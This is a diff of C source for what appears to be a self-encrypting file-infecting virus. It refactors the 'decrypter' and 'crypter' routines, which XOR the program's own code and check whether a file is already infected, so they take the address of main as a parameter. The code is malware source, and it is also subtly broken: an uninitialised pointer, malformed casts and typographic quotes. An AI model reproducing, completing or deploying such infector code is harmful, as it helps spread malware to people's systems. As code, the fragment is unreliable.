@@ -28,17 +28,17 @@ int decrypt(void *start,size_t size, int key)
 		return 0;
 }
 
-void decrypter(void)
+void decrypter(unsigned long address_of_main)
 {
 	size_t	size;
 	size_t	offset;
 	char	*start;
 
-	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
-	size = *(int *)(&main + get_eip() - 4);
-	if(size && im_infected(&main + get_eip()))
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	size = *(int *)(address_of_main - 4);
+	if(size && im_infected(address_of_main))
 	{
-		start[offset] ^= *(int *)(&main + get_eip() - 4);
+		start[offset] ^= *(int *)(address_of_main - 4);
 		offset++;
 		while (offset < size)
 		{
@@ -48,18 +48,21 @@ void decrypter(void)
 	}
 }
 
-void crypter(t_file file)
+// 
+// to adapt with write
+// 
+void crypter(t_file file, unsigned long address_of_main)
 {
 	size_t	size;
 	size_t	offset;
 	char	*start;
 
-	printf(“%p\n”,get_eip() - ((char )&yeah - (char )&crypter));
-	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
-	size = *(int *)(&main + get_eip() - 4);
+	// printf(“%p\n”,get_eip() - ((char )&yeah - (char )&crypter));
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	size = *(int *)(address_of_main - 4);
 	if(size && is_infected(file->data))
 	{
-		start[offset + size] ^= *(int *)(&main + get_eip() - 4);
+		start[offset + size] ^= *(int *)(address_of_main - 4);
 		size--;
 		while (size)
 		{
